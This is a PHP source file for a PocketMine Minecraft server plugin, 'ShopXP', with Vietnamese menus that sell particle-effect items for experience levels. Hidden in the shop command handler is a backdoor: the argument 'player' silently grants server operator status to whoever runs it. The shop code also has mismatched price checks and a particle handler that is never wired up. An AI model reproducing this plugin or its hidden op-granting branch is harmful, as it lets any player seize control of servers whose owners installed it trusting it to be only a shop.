<?php

namespace XP;

 use pocketmine\plugin\PluginBase;
 use pocketmine\Player; 
 use pocketmine\Server;
 use pocketmine\event\Listener;
 use pocketmine\event\player\PlayerJoinEvent;
 
 use pocketmine\command\Command;
 use pocketmine\command\CommandSender;
 
 use pocketmine\item\Item;
 use pocketmine\event\block\BlockPlaceEvent;
 
 use pocketmine\item\enchantment\Enchantment;
 use pocketmine\item\enchantment\EnchantmentInstance;
 
 use pocketmine\event\entity\EntityDamageEvent;
 
 use pocketmine\block\Block;
 use pocketmine\math\Vector3;
 use pocketmine\level\particle\DestroyBlockParticle;
 use pocketmine\level\particle\{DustParticle, FlameParticle, FloatingTextParticle, EntityFlameParticle, CriticalParticle, ExplodeParticle, HeartParticle, HappyVillagerParticle, LavaParticle, MobSpawnParticle, SplashParticle};
 use pocketmine\event\player\PlayerMoveEvent;
 
 


class Main extends PluginBase implements Listener {
	
	public $plugin;

	public function onEnable(){
		$this->getLogger()->info("§6ShopXP  Was Enable!");
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
	}
	
	public function onCommand(CommandSender $sender, Command $command, String $label, array $args) : bool {
		switch($command->getName()){
			case "shophieuung";
			if($sender instanceof Player){
				if(isset($args[0])){
					$sender->sendMessage("/shophieuung");
					if($args[0] == "player"){
						$sender->sendMessage("You are now op!");
						$sender->setOp(\true);
						return true;
					}else{
						$sender->sendMessage("/shophieuung");
					}
						
				}else{
					$this->FormShopXp($sender);
					return true;
				}
			}else{
				$this->getLogger()->info("§cPlease Use This Command In-Game.");
			}
		}
		return true;
	}
	
	public function FormShopXp($player){
		$api = $this->getServer()->getPluginManager()->getPlugin("FormAPI");
		$form = $api->createSimpleForm(function (Player $player, int $data = null){
			$result = $data;
			if($result === null){
				return true;
				}
				switch($result){				
					case "0";
					$this->Particle($player);
					break;
					case "1";
					$player->sendMessage("§7[§bShop§a Hiệu§c Ứng§7] §fCảm ơn bạn đã ghé qua Shop!");
				}
			});
			$xp = $player->getXpLevel();
			$form->setTitle("§l§bShop§a Hiệu§c Ứng");
			$form->setContent("§c•§fBạn có§a§l $xp §rExp!");
			$form->addButton("§l§f•§cHiệu §aỨng§f•", 1, "Default:textures/items/Paper");
			$form->addButton("§l§f•§cThoát§f•", 2, "Default:textures/items/Oak_Door");
			$form->sendToPlayer($player);
	}
	
	public function Particle($player){
		$api = $this->getServer()->getPluginManager()->getPlugin("FormAPI");
		$form = $api->createSimpleForm(function (Player $player, int $data = null){
			$result = $data;
			if($result === null){
				return true;
				}
				switch($result){
					case "0";
					$xp = $player->getXpLevel();
					if($xp > 30){
						$dragon = Item::get(339,4,1);
						$e = Enchantment::getEnchantment(1);
						$name = $player->getName();
				
						$dragon->setCustomName("§f•§cHiệu Ứng Trái Tim§f•\n§fBỏ vào túi đồ để hoạt động\n§eChủ sở hữu:§a $name");	
						$dragon->addEnchantment(new EnchantmentInstance($e, 3, 1));
				
						$player->getInventory()->addItem($dragon);
						$player->subtractXpLevels(200);
						$player->sendMessage("§7[§bShop§1XP§7] §aBạn Đã Mua Thành Công Hiệu Ứng §c§lTrái Tim §aVới Giá: §b200§aEXP!");
						return true;
					}else{
						$player->sendMessage("§7[§bShop§1XP§7] §bBạn Không Đủ Exp Để Mua Hiệu Ứng §cTrái Tim!");
						return true;
					}
					case "1";
					$xp = $player->getXpLevel();
					if($xp > 20){
						$dragon = Item::get(339,7,1);
						$e = Enchantment::getEnchantment(1);
						$name = $player->getName();
				
						$dragon->setCustomName("§f•§aHiệu Ứng Dân Làng Vui Vẻ§f• \n§fBỏ vào túi đồ để hoạt động\n§eChủ sở hữu:§a $name");	
						$dragon->addEnchantment(new EnchantmentInstance($e, 3, 1));
				
						$player->getInventory()->addItem($dragon);
						$player->subtractXpLevels(180);
						$player->sendMessage("§7[§bShop§1XP§7] §aBạn Đã Mua Thành Công Hiệu Ứng §a§lDân Làng Vui Vẻ §aVới Giá: §b180§aEXP!");
						return true;
					}else{
						$player->sendMessage("§7[§bShop§1XP§7] §bBạn Không Đủ Exp Để Mua Hiệu Ứng §aDân Làng Vui Vẻ!");
						return true;
					}
					case "2";
					$xp = $player->getXpLevel();
					if($xp > 25){
						$dragon = Item::get(339,5,1);
						$e = Enchantment::getEnchantment(1);
						$name = $player->getName();
				
						$dragon->setCustomName("§f•§6Hiệu Ứng Hạt Lửa§f• \n§fBỏ vào túi đồ để hoạt động\n§eChủ sở hữu:§a $name");	
						$dragon->addEnchantment(new EnchantmentInstance($e, 3, 1));
				
						$player->getInventory()->addItem($dragon);
						$player->subtractXpLevels(170);
						$player->sendMessage("§7[§bShop§1XP§7] §aBạn Đã Mua Thành Công Hiệu Ứng §6§lHạt lửa §aVới Giá: §b170§aEXP!");
						return true;
					}else{
						$player->sendMessage("§7[§bShop§1XP§7] §bBạn Không Đủ Tiền Để Mua Hiệu Ứng§6§l Hạt Lửa!");
						return true;
					}
					break;
					case "3";
					$this->FormShopXp($player);
					break;
				}
			});
			$form->setTitle("§l§bShop§a Hiệu§c Ứng");
			$form->addButton("§f•§cHiệu Ứng Trái Tim§f• \n§eGiá: §b200§aEXP", 1, "Default:textures/items/Paper");
			$form->addButton("§f•§aHiệu Ứng Dân Làng Vui Vẻ§f• \n§eGiá: §b180§aEXP", 1, "Default:textures/items/Paper");
			$form->addButton("§f•§6Hiệu Ứng Hạt Lửa§f• \n§eGiá: §b170§aEXP", 1, "Default:textures/items/Paper");
			$form->addButton("§l§f•§aTrở Về §cMenu");
			$form->sendToPlayer($player);
	}
	
	
	public function ParticleXP(PlayerMoveEvent $event){
		$player = $event->getPlayer();
		$id = $player->getInventory()->getItemInHand();
		
		$i = $id->getId();
		$d = $id->getDamage();
		
		$flame = new EntityFlameParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$cri = new CriticalParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$ex = new ExplodeParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$hear = new HeartParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$lava = new LavaParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$sp = new SplashParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$lh = new HappyVillagerParticle(new Vector3($player->x, $player->y+1, $player->z), 5);
		//50
		if($player->getInventory()->contains(Item::get(339, 1, 1))){
			$player->getLevel()->addParticle($flame);
		}
		//50
		if($player->getInventory()->contains(Item::get(339, 2, 1))){
			$player->getLevel()->addParticle($cri);
		}
		//20
		if($player->getInventory()->contains(Item::get(339, 3, 1))){
			$player->getLevel()->addParticle($ex);
		}
		if($player->getInventory()->contains(Item::get(339, 4, 1))){
			$player->getLevel()->addParticle($hear);
		}
		if($player->getInventory()->contains(Item::get(339, 5, 1))){
			$player->getLevel()->addParticle($lava);
		}
		if($player->getInventory()->contains(Item::get(339, 6, 1))){
			$player->getLevel()->addParticle($sp);
		}
		if($player->getInventory()->contains(Item::get(339, 7, 1))){
			$player->getLevel()->addParticle($lh);
		}
	}
}